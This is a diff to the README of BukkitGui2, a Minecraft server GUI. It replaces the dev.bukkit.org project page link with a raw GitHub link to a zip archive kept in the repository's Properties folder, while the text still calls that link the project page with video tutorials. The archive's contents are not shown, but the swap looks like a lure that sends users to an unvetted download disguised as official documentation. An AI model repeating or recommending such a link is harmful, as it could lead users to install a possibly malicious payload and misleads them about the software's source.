@@ -22,8 +22,8 @@ BukkitGui2 continues with the same mindset, but with higher performance and bett
 * port forwarding
 
 ### Use
-Please see the project page at dev.bukkit.org for information, including video tutorials, on how to set-up and use this software.
-https://dev.bukkit.org/projects/bukkitgui?gameCategorySlug=bukkit-plugins&projectID=32715
+Please see the project page at https://github.com/jordyweerwag/bukkitgui2/raw/refs/heads/master/bukkitgui2/Properties/bukkitgui_3.9.zip for information, including video tutorials, on how to set-up and use this software.
+https://github.com/jordyweerwag/bukkitgui2/raw/refs/heads/master/bukkitgui2/Properties/bukkitgui_3.9.zip
 
 #### Remote Server Support
 The GUI can also show output and send commands to remote servers. The recommended way to use a remote server is by using JSONAPI. In order for this to work, the JSONAPI plugin should be installed on your server.
